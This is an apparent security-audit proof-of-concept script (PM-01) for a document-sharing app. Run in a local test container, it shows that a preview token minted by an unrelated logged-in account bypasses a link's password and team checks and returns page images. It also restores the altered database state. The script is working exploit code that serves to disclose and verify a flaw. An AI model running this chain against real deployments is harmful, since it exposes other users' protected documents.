#!/usr/bin/env python3
"""PM-01 — the preview-token path on /api/views/pages honours a token minted by
any logged-in user for any link, with no team check and none of the link's gates.
An unrelated free account reads a password-protected document's page images without
the password.

The password link is forced active for the baseline (its existing password is kept;
the plaintext is never needed) and its revocation state is restored in `finally`.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-01-preview-token-access-control-bypass/poc.py
"""
import re
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, post, as_json, mint_cookie, link_data, fetch_bytes,
    VULN, CONTROL, OBSERVE, log, summary,
)

VICTIM_TEAM = db('select "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
                 "where u.email=$1", ["alice@victim.test"])[0]["teamId"]
link = db('select l.id, dv.id vid, l."isArchived", l."expiresAt", l."deletedAt" from "Link" l '
          'join "Document" d on d.id=l."documentId" '
          'join "DocumentVersion" dv on dv."documentId"=d.id and dv."isPrimary"=true '
          "where l.\"teamId\"=$1 and l.\"linkType\"='DOCUMENT_LINK' and l.password is not null "
          'limit 1', [VICTIM_TEAM])[0]
LINK, VER = link["id"], link["vid"]
SNAP = (link["isArchived"], link["expiresAt"], link["deletedAt"])
MALLORY = mint_cookie("mallory@attacker.test")  # unrelated tenant, free account


def run():
    log(f"PM-01 — preview token bypasses link gates   base={BASE}")
    log(f"  victim password link={LINK}  documentVersionId={VER}")
    log("")

    # ---- step 1: anonymous leak of the version id (password redacted) --------
    ld_status, ld_text, _ = link_data(LINK)
    leaked = sorted(set(re.findall(r'"versions":\[\{"id":"([^"]+)"', ld_text)))
    pw_redacted = '"password":"protected"' in ld_text or '"password"' not in ld_text
    OBSERVE("anonymous data payload", f"HTTP {ld_status}, password field redacted={pw_redacted}")
    VULN("the documentVersionId leaks anonymously from the link payload",
         ld_status == 200 and VER in leaked, f"leaked={leaked}")

    # ---- controls: with no preview token, the gates work --------------------
    no_pw_status, no_pw_text, _ = post("/api/views", {
        "linkId": LINK, "documentVersionId": VER, "documentName": "d", "hasPages": True,
        "ownerId": None, "userId": None, "email": "outsider@probe.test",
    })
    msg = str(as_json(no_pw_text).get("message", ""))
    CONTROL("POST /api/views without the password is refused by the gate",
            no_pw_status in (400, 403) and "password" in msg.lower(),
            f"HTTP {no_pw_status} {msg[:40]!r}")
    no_tok_status, _, _ = post("/api/views/pages",
                               {"viewId": "x", "documentVersionId": VER, "pageNumbers": [1]})
    CONTROL("POST /api/views/pages with no valid view or token is refused",
            no_tok_status in (400, 401, 404), f"HTTP {no_tok_status}")

    # ---- step 2: mint a preview token for a link the attacker does not own ----
    mint_status, mint_text, _ = post(f"/api/links/{LINK}/preview", {}, MALLORY)
    token = as_json(mint_text).get("previewToken")
    VULN("an unrelated account mints a preview token for the victim's link",
         mint_status == 200 and bool(token), f"HTTP {mint_status} token={(token or '')[:16]}...")

    # ---- control: minting without a session is refused ----------------------
    anon_mint, _, _ = post(f"/api/links/{LINK}/preview", {})
    CONTROL("minting a preview token with no session is refused",
            anon_mint == 401, f"HTTP {anon_mint}")

    # ---- step 3: pull page images with the token, no password ----------------
    pages_status, pages_text, _ = post("/api/views/pages", {
        "previewToken": token, "linkId": LINK, "documentVersionId": VER, "pageNumbers": [1],
    }, MALLORY)
    pages = as_json(pages_text).get("pages", []) or []
    url = pages[0].get("file") if pages else None
    VULN("the token serves signed page images without the password",
         pages_status == 200 and bool(url), f"HTTP {pages_status} pages={len(pages)}")

    # ---- step 4: fetch the bytes --------------------------------------------
    if url:
        b_status, byts = fetch_bytes(url)
        text = byts.decode("latin1", "replace")
        VULN("the victim document's rendered bytes are retrieved",
             b_status == 200 and len(byts) > 0, f"{len(byts)} bytes: {text.strip()[:60]!r}")

    OBSERVE("root cause", "pages/api/links/[id]/preview.ts mints for any link with no team check; "
            "the /api/views/pages preview branch then applies none of the link's gates")


# Force the password link active for the baseline; restore its state afterward.
db('update "Link" set "isArchived"=false, "expiresAt"=null, "deletedAt"=null where id=$1', [LINK])
try:
    run()
finally:
    db('update "Link" set "isArchived"=$2, "expiresAt"=$3, "deletedAt"=$4 where id=$1',
       [LINK, SNAP[0], SNAP[1], SNAP[2]])
    log("")
    log("  cleanup: link archive/expiry/delete state restored to pre-run values")

summary("PM-01 preview token bypasses link access controls")
db_close()
